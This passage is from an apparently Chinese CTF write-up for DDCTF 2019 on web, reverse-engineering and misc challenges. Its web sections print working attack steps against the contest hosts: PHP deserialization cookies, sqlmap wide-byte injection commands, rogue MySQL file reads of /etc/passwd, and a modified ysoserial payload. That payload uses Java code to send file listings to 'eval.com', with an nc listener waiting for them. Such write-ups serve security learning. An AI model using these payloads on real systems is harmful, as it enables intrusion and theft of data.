$file);，我们可以使用config来代替。故payload为:117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==返回内容base64解码： 简单的变量覆盖题，extract($_GET);会将GET内容转换成变量。file_get_contents($k)使用php://input将会返回post的数据getflag:flag: DDCTF{436f6e6772617******174696f6e73} Web签到题 打开题目，提示不是管理员权限，观察请求header，发现字段：didictf_username的值为空burp拦截数据包修改为admin，返回内容：您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php访问app/fL2XID2i0Cdh.php得源码： url:app/Application.php Class Application { var $path = ''; public function response($data, $errMsg = 'success') { $ret = ['errMsg' => $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) { $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; }else{ $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { if(empty($this->path)) { exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } url:app/Session.php include 'Application.php'; class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = file_get_contents('../config/key.txt'); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { parent::response('the ip addree not match'.'error'); return FALSE; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index(); 这里我才有回溯的方法，先确定flag可能的输出点在构造满足条件的payload。在private function get_key()函数里提示到flag与eanccrykey在同一个文件夹，猜测flag内容在../config/flag.txt里。通读代码，可以发现唯一可能的flag输出点在public function __destruct()，这是Application类的析构函数，退出时会自动执行里边的代码，结合下边的serialize与unserialize易知此题考的是php反序列化。而我们发现，如果我们直接对cookie进行修改是不行，这是因为服务端使用key进行了加密验证处理，如果我们能拿到key的内容，那么变可以轻易绕过。 if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } 我们注意到此处函数涉及到key值的操作，其中sprintf为占位符替换函数。如果我们post的nickname值里存在%s 那么key值也会随着输出。先获得cookie值，记得header头加上didictf_username: admin将cookie替换，post内容:nickname=a---%s得到key:EzblrbNS，至此大工告成。理清下思路： 1.新建Application类，修改path变量为..././config/flag.txt(../进行过一次过滤) 2.将类加入$userdata数组进行序列化处理 3.返回key加密后的cookie 4.getflag 本地搭建php环境： 将以下源码复制访问 即可生成序列化数据： $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { return true; } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { $this->response($this->user_agent); if(empty($this->path)) { $this->response(\"error111\"); exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = 'EzblrbNS'; } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { return true; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) path = '..././config/flag.txt'; //修改类中变量path $userdata = array( $a, //序列化 'session_id' => md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); parent::response($cookiedata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index();?> 生成数据： a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";} 注意此处的数据由于UA头不同，请自己生成。记得加上key进行md5加密： import hashlib str = 'EzblrbNS'+'a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";}' print(hashlib.md5(str.encode('utf8')).hexdigest()) 得到hash:3c27da16d59c7edbacbf41a5cea391c3修改数据包重放：记得先url编码哟~flag: DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j} UploadIMG 作者：Glzjin 知识点：PHP-GD 二次渲染绕过 步骤： 1、用上面给出的用户名密码打开靶机，发现是这么一个页面。2、那么就传一个图片上去试试吧。3、上传之后，发现提示 “[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()”，并且还返回了上传之后图片的地址。4、那么我们就把我们上传之后的图片下载回来看看吧。下载之后用 hex 编辑器打开。发现开头这儿指明了其是 php-gd 带着 libjpeg 转换的。5、比较一下原图片和现在的图片，似乎有很多不同。6、那么我们把下载下来的图片再传回去呢？7、啊哈，这一把前面倒是蛮多相同的地方了。8、那么我们就往里面相同的部分替换 “phpinfo()” (9字节)试试。9、不断 fuzz 插入的位置，发现插入这里可以。10、Flag 到手~ 大吉大利，今晚吃鸡~ 本文作者：12end进去注册，登录后只有100金币，但是吃鸡的ticket需要2000金币，需要想办法绕过去。 购买ticket 截取添加订单的请求，发现是一个简单的get请求，且ticket_price是可控的：经尝试发现，这个tickiet_price只可以修改地比2000大，且只能含有数字，那么我们只能考虑整数溢出了。在32位系统下，所有无符号整数的数量是2^32=4294967296，去掉0这个数的话，最大整数便是4294967295，当我们令一个数等于2^32时，它便会溢出为0。我们这里传入4294967297,虽然订单页面显示的还是如此，但实际支付订单时，它才产生了溢出，初步认为他是以字符串存入，在运算时再转换为整型（可能并不准确），最后只花了1金币购买：进到游戏之后，可以通过提交正确id与ticket来移除对手，没什么好办法，经过一番尝试了解到id与ticket是固定对应的关系，只有写脚本通过暴力注册获取尽可能多的id，然后一一删除了。 tips:剩余对手的100人中，id是任意的，你并不能保证只需要注册100次就可以删掉全部的对手，最有效的办法是注册一次删除一次。 因篇幅原因，抓取api请求，并编写脚本的过程便不再赘述，脚本注释已较为详尽，使用时修改参数即可，唯一缺憾是代码健壮性欠佳，遇到网络问题时不能处理错误造成崩溃，但代码作用是可续的，所以问题不大，重启脚本就可以继续了 import requests import time regist = \"http://117.51.147.155:5050/ctf/api/register?password=11111111&name=\"#name添加一个前缀 buy_ticket = \"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\" pay_ticket = \"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\" delete = \"http://117.51.147.155:5050/ctf/api/remove_robot\" get_flag=\"http://117.51.147.155:5050/ctf/api/get_flag\" i= 55555 #初始化用户名,使用未注册过的数字 def delete_robot(player_id, player_ticket): COOKIE = {\"Cookie\": \"user_name=; REVEL_SESSION=\"} #修改为自己主账户的cookie param={\"id\":player_id,\"ticket\":player_ticket} requests.get(delete,params=param, headers=COOKIE) #删除id flag = requests.get(get_flag, headers=COOKIE) #获取剩余的敌人数量 print(flag.text ) while True: t = requests.session() i+=1 r = t.get(regist + str(i)) #注册 r = t.get(buy_ticket).json() #购买Ticket，解析json bill_id = r[\"data\"][0][\"bill_id\"] #json解析bill_id r = t.get(pay_ticket + bill_id).json() #支付订单 player_id = r[\"data\"][0][\"your_id\"] player_ticket = r[\"data\"][0][\"your_ticket\"] #json解析id与ticket delete_robot(player_id,player_ticket) #使用主账户删除id time.sleep(0.3) #短暂休眠避免被封 homebrew event loop 作者：12end直接审计源码对于本题的字串切割函数get_mid_str请自行理解，如果不明白这个函数的话，下面的payload将难以理解原理。首先，eval的那部分由于分割不当可以通过注释符导致代码执行，我们可以构造?action:show_flag_function%23;请求来执行一个（没卵用的函数）:能够执行，就该思考怎么进一步利用以获取flag不难看出，本题靠队列控制函数的执行流程，且唯一获取flag的函数被ban掉了返回值: def show_flag_function(args): #被ban的输出flag函数，没有return flag flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) ' 仔细观察代码，我们发现还可以从两个地方获取flag： 1.直接执行FLAG() 2.执行get_flag_handler会通过trigger_event('func:show_flag;' + FLAG())将flag的值入队 我最开始想到的方法便是直接执行FLAG()，在flask中，视图函数的返回值会被传输到前端以供展示，这道题的视图函数entry_point的返回值是execute_event_loop(),而execute_event_loop的返回值resp是由事件循环中执行函数的返回值ret_val决定的，这也就是我们直接执行show_flag_function函数会将返回值打印在前端的原因。以此推出，如果能直接执行FLAG()，flag也会被打印出来。到此为止似乎一帆风顺，我们把上面的请求稍作修改不就可以拿flag了吗？实际测试却404了。 404的原因在这里： try: event_handler = eval(action + ('_handler' if is_action else '_function')) #eval造成的代码执行，从这里下手 ret_val = event_handler(args) #获取返回值 可以看到第三行的执行函数是带有参数的，而我们试图向一个不需要参数的函数传参时，python会抛出参数过多的错误，try失败后就会导致404。思考了很久也没有想出能够绕过这里的地方，如果绕过去了，这应当是一个非预期解。 经@Smi1e师傅的指导，知道这道题要利用flask的客户端session导致的安全问题。相关文章：客户端 session 导致的安全问题好巧不巧，题中的执行队列恰巧是存储在session中的。那么，我们只需要利用上面提到的第二点来将flag值入队，解密此时的session即可。payload:?action:trigger_event%23;action:buy;5%23action:get_flag; mysql弱口令 作者：12end提示先部署agent.py再进行弱口令扫描 在agent.py的响应函数中，返回了result的响应内容，result的值来源于_func函数： class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): .... ... result = self._func() self.wfile.write(json.dumps(result)) 研究一下_func()： def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) //执行netstat子进程，获取在监听的tcp服务程序名等信息并输入至pipe netstat.wait() //等待子进程结束 ps_list = netstat.stdout.readlines() //逐行读取 result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = { 'local_address': Local_Address, 'Process_name': Process_name } result.append(tmp_dic) //向result中增加字典元素，包含着进程的源地址及进程名称 return result 可以看出整个程序的作用就是返回tcp服务进程的相关信息，猜测题目的服务器（下称靶机）是以此判断mysql是否在目标服务器（下称客户机）上运行。 尝试一番，当我们未在客户机上运行agent.py时，会提示： 而此时，我们客户机的Mysql是开启着的。 同样，将客户机的Mysql关闭，agent.py运行，会提示未扫描到弱密码。mysql的进程名称是mysqld，我们直接修改self.wfile.write(json.dumps(result))为mysqld可以成功绕过服务器的判断。 绕过了，然后呢？祭出我@Smi1e师傅的一篇blog：MySQL LOAD DATA 读取客户端任意文件 如何利用MySQL LOCAL INFILE读取客户端文件 大意是指,主机A连接远程mysql服务器主机B的过程中，所有请求都是明文传输，而我们可以在主机B上伪造任意内容发送给主机A。 而在MySQL中，LOAD DATA LOCAL INFLIE语句会将本地内容传输给远端服务器，下面是执行LOAD DATA LOCAT INFILE的过程： 本地向远端服务器发起请求包，请求包含要传输的文件路径-> 远端服务器对请求进行响应，响应内容为请求包中的文件路径-> 本地发送响应包中的文件内容 如果我们可以伪造响应的任意内容，也就意味着能够读取到连接者本地的任意文件 最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。（前提是客户端已经请求了任意内容，幸运的时，绝大多数客户端都会在连接mysql成功时发送一系列类似@@version的初始化请求） 不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。 回归正题，为了与靶机建立连接，我们就需要让靶机认为已经连接上了我们的数据库，我们只需向其响应greeting以及authok的数据包即可，然后再发送精心构造好的数据包，让靶机把我们想要的文件给响应过来在github上已有相关的项目以部署这样的恶意mysql服务器：Rogue-MySql-Server在这里以python的脚本为例： 修改26行的filelist为我们想要读取的文件路径，假设为’/etc/passwd’，先开启agent.py欺骗靶机，告诉它我们已经开启了mysqld进程，再开启这个poc.py，然后让靶机扫描一下我们的客户机： 最后的文件信息会在当前目录下的mysql.log：root用户的mysql操作一般记录在：~/.mysql_history中，读取一下就可以拿到flag 欢迎报名DDCTF 作者：evoA太脑洞了，太脑洞了，太脑洞了一直以为是sql，直到用xss的exp发现有bot请求在报名页面的备注里只对sql进行一点过滤，但是xss没有任何过滤，直接即可通过xss平台读页面源码读到一个接口http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id= 测了半天注入还是没东西，结果一堆人做出来后重新复测，注意到返回头GBK然后就是宽字节注入SQLmap加tamper都可以跑 #所有数据库名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --dbs --hex #数据库表名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex -D \"ctfdb\" --tables #字段名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex -D \"ctfdb\" -T \"ctf_fhmHRPL5\" --columns #flag python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex --sql-shell sql-shell> select ctf_value from ctfdb.ctf_fhmHRPL5; 常规操作，注库名，表名，字段名（TCL）做的时候想的太复杂了，但是我的sqlmap最后这里不能直接--dump，所以我执行了--sql-shell自定义sql命令最终拿的flagsqlmap宽字节注入自带的tamper是unmagicquotes这里因为过滤了单引号，所以我们需要用--hex参数将字符串转为0x开头的16进制数字避开引号 再来1杯Java 作者：5am3p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己太菜了，虽然本科专业为java开发狗。但我真的不太熟啊...一共分为三关吧。 首先是一个PadOracle攻击，伪造cookie。这个解密Cookie可以看到hint： PadOracle:iv/cbc。 第二关，读文件，看到后端代码后，才发现，这里贼坑。 第三关，反序列化。 首先第一关好说，其实在/api/account_info这个接口，就可以拿到返回的明文信息。然后通过Padding Oracle + cbc翻转来伪造cookie即可。在这里就不多说了。网上很多资料。 最后拿到cookie，直接浏览器写入cookie就OK。然后可以获取到一个下载文件的接口。 /api/fileDownload?fileName=1.txt 虽然说是一个任意文件读取的接口，但是贼坑、一顿操作猛如虎，最后只读出/etc/passwd... 搜到了很多字典。然后burp爆破一波，最后发现/proc/self/fd/15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）源码也不多，很容易，可以看到一个反序列化的接口。在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。 https://xz.aliyun.com/t/2479 直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。修改替换开启监听端口建议采用ceye的dnslog查看java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {{port}} URLDNS {{http://eval.com}}生成链接JRMPListener的payloadip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8119}} | base64此时将第10行生成的代码，直接打到远程即可。然后查看dnslog信息。发现存在，那就是ok了。接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！这个是hint中给的，所以我们需要找另一种方式，如：代码执行。查阅资料，发现ysoserial预留了这块的接口，修改即可。 https://blog.csdn.net/fnmsd/article/details/79534877 然后我们尝试去修改ysoserial/payloads/util/Gadgets.java中createTemplatesImpl方法如下： // createTemplatesImpl修改版，支持代码执行 public static T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory ) throws Exception { final T templates = tplClass.newInstance(); // use template gadget class ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); final CtClass clazz = pool.get(StubTransletPayload.class.getName()); // run command in static initializer // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections // String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + // command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + // \"\\\");\"; String cmd=\"\"; //如果以code:开头，认为是代码，否则认为是命令 if(!command.startsWith(\"code:\")){ cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + \"\\\");\"; } else{ System.err.println(\"Java Code Mode:\"+command.substring(5));//使用stderr输出，防止影响payload的输出 cmd = command.substring(5); } clazz.makeClassInitializer().insertAfter(cmd); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion) clazz.setName(\"ysoserial.Pwner\" + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); final byte[] classBytes = clazz.toBytecode(); // inject class bytes into instance Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][] { classBytes, ClassFiles.classAsBytes(Foo.class) }); // required to make TemplatesImpl happy Reflections.setFieldValue(templates, \"_name\", \"Pwnr\"); Reflections.setFieldValue(templates, \"_tfactory\", transFactory.newInstance()); return templates; } 此时，我们的payload已经可以支持代码执行了。在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。修改替换开启监听端口建议采用ceye的dnslog查看执行时合并为一行，为了好看，我换了下行 java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 CommonsBeanutils1 'code:System.out.printld(\"aaa\");' 生成链接JRMPListener的payloadip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64 此时将第10行生成的代码，直接打到远程即可。然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。 // 以下代码使用时，记得压缩到一行。 // 获取目录下内容 java.io.File file =new java.io.File(\"/\"); java.io.File[] fileLists = file.listFiles(); java.net.Socket s = new java.net.Socket(\"eval.com\",8768); for (int i = 0; i 然后操作如下：修改替换开启监听端口建议采用ceye的dnslog查看执行时合并为一行，为了好看，我换了下行 java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 CommonsBeanutils1 'code:{{javapayload}}' 生成链接JRMPListener的payload ip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64监听端口数据 nc -lnvp 2333 此时将第10行生成的代码，直接打到远程即可。 p.s. /flag是个文件夹 Reverse 作者：admin-琴里、impakho Cofused 这个文件下载下来是app的安装包然后再安装包里发现了一个叫xia0Crackme文件然后我们拖到IDA里面查找字符串交叉引用来到关键函数函数都标有注释（震惊！出题人果然是一个良好的大佬）程序验证了前六位是不是”DDCTF{“以是不是”}”然后把中间的字符串当做参数传到sub_1000011D0函数里如果这个函数的返回值等于1的话这个flag则正确 然后sub_1000011D0函数中首先是初始化了一个区域：v2Sub_100001f60是通过输入的字符串和内存数据对v2进行赋值操作前段是对v2进行赋值，最后将输入的字符串拷贝到qword_100003F58+48的位置 sub_100001F00函数对(*v2+24)进行赋值把一段数据赋给了他，然后是一个循环判断条件就是刚刚赋值的数据是不是等于“0xf3” 然后我们进入sub_100001E50这个函数是控制程序执行的vm的分支 跳转的分支就是刚刚给v2赋值的函数地址 sub_100001D70：相当于给一个寄存器赋值的操作然后sub_100001A60：异或操作ub_100001AA0：对操作后的字符和输入的字符进行比较sub_100001CB0：加操作sub_100001CF0：减操作sub_100001B10:设置判断是否正确标志位sub_100001D30：赋值操作 sub_100001C60：对内存中的数据进行操作两种运算:A～Z和a～z具体数据： 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x30, 0xf6,0xc1, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x31, 0xf6,0xb6, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x32, 0xf6,0xab, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x33, 0xf6,0xa0, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x34, 0xf6,0x95, 0xf0,0x10,0x57,0x0,0x0,0x0, 0xf8, 0xf2,0x35, 0xf6,0x8a, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x36, 0xf6,0x7f, 0xf0,0x10,0x73,0x0,0x0,0x0, 0xf8, 0xf2,0x37, 0xf6,0x74, 0xf0,0x10,0x45,0x0,0x0,0x0, 0xf8, 0xf2,0x38, 0xf6,0x69, 0xf0,0x10,0x6d,0x0,0x0,0x0, 0xf8, 0xf2,0x39, 0xf6,0x5e, 0xf0,0x10,0x72,0x0,0x0,0x0, 0xf8, 0xf2,0x3a, 0xf6,0x53, 0xf0,0x10,0x52,0x0,0x0,0x0, 0xf8, 0xf2,0x3b, 0xf6,0x48, 0xf0,0x10,0x66,0x0,0x0,0x0, 0xf8, 0xf2,0x3c, 0xf6,0x3d, 0xf0,0x10,0x63,0x0,0x0,0x0, 0xf8, 0xf2,0x3d, 0xf6,0x32, 0xf0,0x10,0x44,0x0,0x0,0x0, 0xf8, 0xf2,0x3e, 0xf6,0x27, 0xf0,0x10,0x6a,0x0,0x0,0x0, 0xf8, 0xf2,0x3f, 0xf6,0x1c, 0xf0,0x10,0x79,0x0,0x0,0x0, 0xf8, 0xf2,0x40, 0xf6,0x11, 0xf0,0x10,0x65,0x0,0x0,0x0, 0xf8, 0xf2,0x41, 0xf6,0x6, 0xf7,0x1,0x0,0x0,0x0,0xf3 最后可以得到flag：hello******TheFlag DDCTF{hello******TheFlag}(PS:题目作者真是一名优秀的程序员) Reverse 2 作者：impakho查壳，显示 ASPack ，用工具脱壳。上 IDA 分析。sub_11D11F0 函数判断输入的字符串是否在 0-9,A-F 的范围内，并且长度是否为偶数。sub_11D1240 函数是一个 hex2bin 的转换。sub_11D1000 函数是一个 base64 编码的过程，编码结果再异或 0x76。编码表为 byte_11D3020。 贴上解密脚本： enc='reverse+' dec1='' table='373435323330313E3F3C3D3A3B383926272425222320212E2F2C171415121310111E1F1C1D1A1B181906070405020300010E0F0C46474445424340414E4F5D59'.decode('hex') dec2=[] flag='' for i in enc: dec1+=chr(ord(i)^0x76) for i in dec1: dec2.append(table.index(i)) for i in range(2): a=dec2[4*i+0] b=dec2[4*i+1] c=dec2[4*i+2] d=dec2[4*i+3] flag+=chr((a>4)) flag+=chr(((b>2)) flag+=chr(((cFlag: DDCTF{AD******C7BE} MISC 作者：admin-琴里、impakho wireshark 我们得到流量包，分析流量包并未发现敏感信息。 。。然后，就试着导出文件 得到：并未有任何发现。。 然后，就试着再次分析流浪包。 在追踪流时发现多个图片。又发现了一个解密网站。。。把图片手动导出。。。 （16进制工具） 得到：发现了钥匙。。。然后就是获得key发现图片钥匙头朝下。。。猜测可能隐藏高度：把高度改为07 50，得到keykey:57pmYyWt然后在线解密就得到flag了。 MulTzor 题目提供的是hex,根据题目分析，可知是词频分析，本打算统计词频分析来做，想到了xortools,猜测词频中最常见的字符为0x20，即空格符。 txt = \"38708d2a29ff535d9e3f20f85b40df3c3fab465b9a731ce55b54923279e85b4397362be25c54df2020f8465692733ce55351 93363dab465b9a732eee41479a2137ab735f933a3cf8125a91730ee4405f9b730eea4013b61a79ff5d138d3638ef12408a312aff535 d8b3a38e71252923c2ce54640df3c3fab7f5c8d203ca6515c9b363dab40529b3a36ab515c923e2ce55b509e2730e45c40df3c3fab46 5b9a7318f35b40df2336fc57418c732de35347df3b38ef12519a3637ab575d9c3a29e357419a3779fe415a913479ce5c5a983e38ab5 f529c3b30e55740d1730de35b40df2a30ee5e579a3779e65b5f962738f94b13963d2dee5e5f96343ce55156df2431e2515bd37338e7 5d5d98732ee2465bdf2731ea4613992136e6125c8b3b3cf912579a302bf242479a3779ca4a5a8c732bea565a907338e556138b3635e e4241963d2dee40138b2138e5415e96202ae25d5d8c7f79fc5340df3430fd575ddf2731ee125090373ce5535e9a730ce746419e7d79 df5a5a8c732eea41139c3c37f85b579a213cef125186732eee41479a2137ab61468f213ce65713be3f35e25757df1036e65f5291373 cf91277883a3ee34613bb7d79ce5b409a3d31e445568d732de4125b9e253cab50569a3d79a956569c3a2ae24456dd732de412479736 79ca5e5f96363dab445a9c2736f94b1df5590de35713ba3d30ec5f52df3e38e85a5a91362aab45568d3679ea12559e3e30e74b13903 579fb5d418b323be757139c3a29e35741df3e38e85a5a91362aab455a8b3b79f95d47902179f851419e3e3be757418c7d79cc5d5c9b 7336fb57419e2730e555138f2136e857578a213cf81e138f2136fb5741932a79ee5c5590213aee561fdf2436fe5e57df3b38fd57139 2323dee1247973679fb5e46983136ea4057df1637e2555e9e7334ea515b963d3cab475d9d213cea59529d3f3ca5127b90243cfd5741 d37334e44147df3c3fab465b9a731eee405e9e3d79e65b5f962738f94b13993c2be85740d3732aee51419a2779f85741893a3aee411 39e3d3dab515a893a35e2535ddf323eee5c5096362aab465b9e2779fe41569b731ce55b54923279ee5f43933c20ee56138f3c36f912 